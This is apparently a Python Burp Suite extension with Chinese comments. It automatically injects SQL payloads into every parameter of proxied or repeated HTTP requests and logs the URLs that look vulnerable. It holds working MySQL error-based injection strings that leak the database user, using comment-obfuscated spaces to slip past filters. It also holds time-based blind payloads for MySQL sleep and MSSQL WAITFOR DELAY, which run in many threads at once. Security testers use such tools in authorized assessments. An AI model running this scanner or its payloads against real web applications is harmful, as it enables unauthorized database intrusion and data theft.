# -*-coding:utf-8 -*-
# !/usr/bin/env python
# author:ske
# 支持mysql的报错注入和延时注入，mssql的延时注入检测
# 如果需要，可以把注释掉的sql检测语句也加入到检测里
# bool类型检测自己手动检测就行，无需脚本
from __future__ import with_statement
from burp import IBurpExtender
from burp import IHttpListener
from burp import IHttpRequestResponse
from burp import IResponseInfo
from burp import IRequestInfo
from burp import IHttpService

import re
import time
import threading
SLEEP_TIME = 10

saveFile = r'H:\2. py\py_self\py3\project\burpExtend\sql.txt'
print "check SQL\n author:ske"

class FuzzSQL:
    def __init__(self):

        # 单引号，双引号，宽字节+单引号，宽字节+双引号，反斜杠，负数，特殊字符，and，or，xor探测是否存在注入！！！
        self.error = ["'", '"', '\\', '%df%27', '%df%22',
                      '/***/and/***/(select/***/1/***/from(select/***/count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x/***/from/***/information_schema.character_sets/***/group/***/by/***/x)a)--+',
                      "'/***/and/***/(select/***/1/***/from(select/***/count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x/***/from/***/information_schema.character_sets/***/group/***/by/***/x)a)--+",
                      '"/***/and/***/(select/***/1/***/from(select/***/count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x/***/from/***/information_schema.character_sets/***/group/***/by/***/x)a)--+'

                      # '/***/and/***/(select/***/1/***/from/***/(select/***/count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b/***/from/***/information_schema.tables/***/group/***/by/***/b)a)--+',
                      # "'/***/and/***/(select/***/1/***/from/***/(select/***/count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b/***/from/***/information_schema.tables/***/group/***/by/***/b)a)--+",
                      # '"/***/and/***/(select/***/1/***/from/***/(select/***/count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b/***/from/***/information_schema.tables/***/group/***/by/***/b)a)--+',
                      #
                      # '/***/union/***/select/***/count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x/***/from/***/information_schema.tables/***/group/***/by/***/x/***/--+',
                      # "'/***/union/***/select/***/count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x/***/from/***/information_schema.tables/***/group/***/by/***/x/***/--+",
                      # '"/***/union/***/select/***/count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x/***/from/***/information_schema.tables/***/group/***/by/***/x/***/--+',
                      #
                      # '/***/and/***/(updatexml(1,concat(0x5e5e5e,(select/***/user()),0x5e5e5e),1))--+',
                      # "'/***/and/***/(updatexml(1,concat(0x5e5e5e,(select/***/user()),0x5e5e5e),1))--+",
                      # '"/***/and/***/(updatexml(1,concat(0x5e5e5e,(select/***/user()),0x5e5e5e),1))--+',
                      #
                      # '/***/and/***/(extractvalue(1,concat(0x5e5e5e,(select/***/user()),0x5e5e5e)))--+',
                      # '"/***/and/***/(extractvalue(1,concat(0x5e5e5e,(select/***/user()),0x5e5e5e)))--+',
                      # "'/***/and/***/(extractvalue(1,concat(0x5e5e5e,(select/***/user()),0x5e5e5e)))--+"
                      ]


        self.blind = ['/***/and/***/sleep(/***/if(/***/(select/***/length(database())/***/>0)/***/,/***/{},/***/0/***/)/***/)%23'.format(SLEEP_TIME),
                      "'/***/and/***/sleep(/***/if(/***/(select/***/length(database())/***/>0)/***/,/***/{},/***/0/***/)/***/)%23".format(SLEEP_TIME),
                      '"/***/and/***/sleep(/***/if(/***/(select/***/length(database())/***/>0)/***/,/***/{},/***/0/***/)/***/)%23'.format(SLEEP_TIME),

                      # '/***/and/***/If(ascii(substr(database(),1,1))=1,1,sleep(10))--+',
                      # "'/***/and/***/If(ascii(substr(database(),1,1))=1,1,sleep(10))--+",
                      # '"/***/and/***/If(ascii(substr(database(),1,1))=1,1,sleep(10))--+',

                      '/***/WAITFOR/***/DELAY/***/"0:0:{}"--+'.format(SLEEP_TIME),
                      "'/***/WAITFOR/***/DELAY/***/'0:0:{}'--+".format(SLEEP_TIME),
                      '"/***/WAITFOR/***/DELAY/***/"0:0:{}"--+'.format(SLEEP_TIME)



                      # ';WAITFOR/***/DELAY/***/"0:0:10"--+',
                      # "';WAITFOR/***/DELAY/***/'0:0:10'--+",
                      # '";WAITFOR/***/DELAY/***/"0:0:10"--+',
                      #
                      # ');WAITFOR/***/DELAY/***/"0:0:10"--+',
                      # "');WAITFOR/***/DELAY/***/'0:0:10'--+",
                      # '");WAITFOR/***/DELAY/***/"0:0:10"--+'
                    ]

        # 报错注入的特征
        self.errorFlag = re.compile(r'.*(SQL syntax|Warning|mysql_error|\^\^\^).*')

class BurpExtender(IBurpExtender, IHttpListener):

    def registerExtenderCallbacks(self, callbacks):

        self._callbacks = callbacks

        # 用于获取IExtensionHelpers对象，扩展可以使用该对象执行许多有用的任务。返回：包含许多帮助器方法的对象，用于构建和分析HTTP请求等任务。
        self._helpers = callbacks.getHelpers()

        # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。。
        self._callbacks.setExtensionName("SQL Inject")

        # 用于注册侦听器，该侦听器将通知任何Burp工具发出的请求和响应。扩展可以通过注册HTTP侦听器来执行自定义分析或修改这些消息。参数：listener- 实现IHttpListener接口的扩展创建的对象 。
        callbacks.registerHttpListener(self)

        self.fuzzSQL = FuzzSQL()

    # 获取请求的url
    def get_request_url(self, protocol, reqHeaders):
        link = reqHeaders[0].split(' ')[1]
        host = reqHeaders[1].split(' ')[1]
        return protocol + '://' + host + link

    # 保存结果
    def save(self, content):
        print content
        f = open(saveFile, 'at')
        f.writelines(content+'\n\n')
        f.close()

    # 获取请求的一些信息：请求头，请求内容，请求方法，请求参数
    def get_request_info(self, request):
        analyzedRequest = self._helpers.analyzeRequest(
            request)  # analyzeRequest用于分析HTTP请求，并获取有关它的各种关键详细信息。生成的IRequestInfo对象
        reqHeaders = analyzedRequest.getHeaders()  # 用于获取请求中包含的HTTP头。返回：请求中包含的HTTP标头。
        reqBodys = request[analyzedRequest.getBodyOffset():].tostring()  # 获取消息正文开始的请求中的偏移量。返回：消息正文开始的请求中的偏移量。
        reqMethod = analyzedRequest.getMethod()  # 获取请求方法
        reqParameters = analyzedRequest.getParameters()
        return analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters

    # 获取响应的一些信息：响应头，响应内容，响应状态码
    def get_response_info(self, response):
        analyzedResponse = self._helpers.analyzeResponse(
            response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。
        resHeaders = analyzedResponse.getHeaders()  # getHeaders方法用于获取响应中包含的HTTP标头。返回：响应中包含的HTTP标头。
        resBodys = response[
                   analyzedResponse.getBodyOffset():].tostring()  # getBodyOffset方法用于获取消息正文开始的响应中的偏移量。返回：消息正文开始的响应中的偏移量。response[analyzedResponse.getBodyOffset():]获取正文内容
        resStatusCode = analyzedResponse.getStatusCode()  # getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。
        return resHeaders, resBodys, resStatusCode

    # 获取服务端的信息，主机地址，端口，协议
    def get_server_info(self, httpService):
        host = httpService.getHost()
        port = httpService.getPort()
        protocol = httpService.getProtocol()
        ishttps = False
        if protocol == 'https':
            ishttps = True
        return host, port, protocol, ishttps

    # 获取请求的参数名、参数值、参数类型（get、post、cookie->用来构造参数时使用）
    def get_parameter_Name_Value_Type(self, parameter):
        parameterName = parameter.getName()
        parameterValue = parameter.getValue()
        parameterType = parameter.getType()
        return parameterName, parameterValue, parameterType

    # 检查是否存在报错注入
    def check_error_inject(self, request, protocol, host, port, ishttps, parameterName, parameterValueSQL, parameterType):
        thread_id = threading.current_thread().ident
        print '[' + str(thread_id) + ']' + parameterValueSQL
        # 构造参数
        newParameter = self._helpers.buildParameter(parameterName, parameterValueSQL, parameterType)
        # 更新参数，并发送请求
        newRequest = self._helpers.updateParameter(request, newParameter)
        newAnalyzedRequest, newReqHeaders, newReqBodys, newReqMethod, newReqParameters = self.get_request_info(
            newRequest)

        # 新的响应
        newResponse = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
        newResHeaders, newResBodys, newResStatusCode = self.get_response_info(newResponse)

        # 判断是否存在报错注入的特征
        errorInject = self.fuzzSQL.errorFlag.findall(newResBodys)

        if errorInject:
            # 获取请求的url
            newReqUrl = self.get_request_url(protocol, newReqHeaders)
            content = '[+]{} -> {}\n[Headers] -> {}\n[Bodys] -> {}'.format(errorInject, newReqUrl, newReqHeaders, newReqBodys)
            print content
            self.save(content)
            print '-' * 50

    # 检测是否存在延时注入
    def check_blind_inject(self, request, protocol, host, port, ishttps, parameterName, parameterValueSQL, parameterType):
        thread_id = threading.current_thread().ident
        print '[' + str(thread_id) + ']' + parameterValueSQL
        # 构造参数
        newParameter = self._helpers.buildParameter(parameterName, parameterValueSQL, parameterType)

        # 起始时间
        startTime = time.time()
        # 更新参数，并发送请求
        newRequest = self._helpers.updateParameter(request, newParameter)

        newAnalyzedRequest, newReqHeaders, newReqBodys, newReqMethod, newReqParameters = self.get_request_info(
            newRequest)

        # 新的响应
        newResponse = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
        newResHeaders, newResBodys, newResStatusCode = self.get_response_info(newResponse)

        endTime = time.time()
        sleepTime = endTime - startTime
        # 判断是否延时
        if sleepTime >= SLEEP_TIME:
            # 获取请求的url
            newReqUrl = self.get_request_url(protocol, newReqHeaders)
            content = '[+]{} -> {}\n[Headers] -> {}\n[Bodys] -> {}'.format('[Blind]', newReqUrl, newReqHeaders, newReqBodys)
            print content
            self.save(content)
            print '-' * 50

    # 每次burp发送请求时，都会调用该方法
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        '''
        :param toolFlag:            一个标志，指示发出请求的Burp工具。Burp工具标志在IBurpExtenderCallbacks界面中定义
        :param messageIsRequest:    标记是否为请求或响应调用方法。
        :param messageInfo:         要处理的请求/响应的详细信息。扩展可以调用此对象上的setter方法来更新当前消息，从而修改Burp的行为。
        :return:
        '''

        # Proxy和Repeater触发插件
        if toolFlag == 64 or toolFlag == 16 or toolFlag == 8 or toolFlag == 4:

            # 处理响应内容
            if not messageIsRequest:

                # 获取请求包的数据
                request = messageInfo.getRequest()
                analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters = self.get_request_info(request)

                # 获取响应包的数据
                # response = messageInfo.getResponse()  # getResponse方法用于检索请求消息。返回：响应消息。
                # resHeaders, resBodys, resStatusCode = self.get_response_info(response)

                # 获取服务信息
                httpService = messageInfo.getHttpService()
                host, port, protocol, ishttps = self.get_server_info(httpService)

                # 获取请求的url
                # reqUrl = self.get_request_url(protocol, reqHeaders)

                # if reqMethod == 'GET':


                # 多线程遍历每个报错注入
                error_threads = []      # 线程列表
                parameterErrorSQL = []  # 报错语句列表
                for parameter in reqParameters:
                    parameterName, parameterValue, parameterType = self.get_parameter_Name_Value_Type(parameter)
                    for sqlError in self.fuzzSQL.error:
                        parameterErrorSQL.append([parameterName, parameterValue + sqlError, parameterType])    # 构造新的参数值，带有sql测试语句

                for sqlError in parameterErrorSQL:
                    parameterName, parameterValueSQL, parameterType = sqlError
                    t = threading.Thread(target=self.check_error_inject, args=(request, protocol, host, port, ishttps, parameterName, parameterValueSQL, parameterType))
                    error_threads.append(t)
                    t.start()
                for t in error_threads:
                    t.join()

                # 多线程遍历每个延时注入
                blind_threads = []
                parameterBlindSQL = []
                for parameter in reqParameters:
                    parameterName, parameterValue, parameterType = self.get_parameter_Name_Value_Type(parameter)
                    for sqlBlind in self.fuzzSQL.blind:
                        parameterBlindSQL.append([parameterName, parameterValue + sqlBlind, parameterType])

                for sqlBlind in parameterBlindSQL:
                    parameterName, parameterValueSQL, parameterType = sqlBlind
                    t = threading.Thread(target=self.check_blind_inject, args=(request, protocol, host, port, ishttps, parameterName, parameterValueSQL, parameterType))
                    blind_threads.append(t)
                    t.start()
                for t in blind_threads:
                    t.join()


